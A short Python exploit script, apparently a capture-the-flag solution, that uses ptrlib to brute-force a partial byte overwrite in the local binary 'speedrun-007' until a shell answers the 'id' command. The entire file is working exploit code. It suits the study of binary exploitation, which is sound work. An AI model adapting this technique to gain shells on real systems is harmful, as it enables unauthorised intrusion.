from ptrlib import *
from time import sleep

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

payload = b'\x22\x33\xa3'

#log.level = ['warning']
while True:
    sock = Process("./speedrun-007")
    sock.send("hello")
    for i in range(len(payload)):
        sock.recvuntil("(y/n)?")
        sock.send("y")
        sock.send(p16(0x638 + i))
        sock.send(bytes([payload[i]]))
    sock.send("n")
    sock.recvuntil("L8R.\n")
    sock.sendline("id")
    l = sock.recv(timeout=0.1)
    if l:
        print(l)
        break
    l = sock.recv(timeout=0.1)
    if l:
        print(l)
        break
    sock.close()
    sleep(0.1)
